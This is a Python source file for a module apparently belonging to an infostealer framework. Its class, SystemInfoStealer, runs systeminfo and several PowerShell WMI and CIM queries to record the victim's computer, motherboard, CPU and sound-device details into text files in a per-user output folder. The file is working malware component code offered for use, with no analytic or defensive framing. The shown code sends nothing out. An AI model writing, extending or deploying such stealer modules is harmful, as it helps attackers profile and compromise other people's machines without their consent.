import os
import subprocess

from config.manager import ModuleManager


class SystemInfoStealer(ModuleManager):
    def __init__(self) -> None:
        super().__init__(module_name = "SystemInfoStealer")

        self.systeminfo_folder = os.path.join(self.output_folder_user, 'system')
        self.systeminfo_filename = os.path.join(self.systeminfo_folder, 'systeminfo.txt')
        self.computerinfo_filename = os.path.join(self.systeminfo_folder, 'computerinfo.txt')
        self.motherboard_filename = os.path.join(self.systeminfo_folder, 'motherboard.txt')
        self.cpu_filename = os.path.join(self.systeminfo_folder, 'cpu.txt')
        self.sounds_filename = os.path.join(self.systeminfo_folder, 'sounds.txt')

        if not os.path.isdir(self.systeminfo_folder):
            os.makedirs(self.systeminfo_folder)
            
    def systeminfo(self) -> None:
        data = subprocess.check_output(['systeminfo']).decode('utf-8', errors="backslashreplace")
        with open(self.systeminfo_filename, 'w', encoding='utf-8') as _file:
            _file.write(data)
    
    def computerinfo(self) -> None:
        data = subprocess.check_output(['powershell', "Get-ComputerInfo"]).decode('utf-8', errors="backslashreplace")
        with open(self.computerinfo_filename, 'w', encoding='utf-8') as _file:
            _file.write(data)
    
    def motherboard(self) -> None:
        data = subprocess.check_output(['powershell', "Get-WmiObject win32_baseboard"]).decode('utf-8', errors="backslashreplace")
        with open(self.motherboard_filename, 'w', encoding='utf-8') as _file:
            _file.write(data)
    
    def cpu(self) -> None:
        data = subprocess.check_output(['powershell', "Get-WmiObject -Class Win32_Processor -ComputerName. | Select-Object -Property [a-z]*"]).decode('utf-8', errors="backslashreplace")
        with open(self.cpu_filename, 'w', encoding='utf-8') as _file:
            _file.write(data)
    
    def sound(self) -> None:
        data = subprocess.check_output(['powershell', "Get-CimInstance win32_sounddevice | fl *"]).decode('utf-8', errors="backslashreplace")
        with open(self.sounds_filename, 'w', encoding='utf-8') as _file:
            _file.write(data)

    def run(self) -> None:
        self.systeminfo()
        self.computerinfo()
        self.motherboard()
        self.cpu()
        self.sound()
        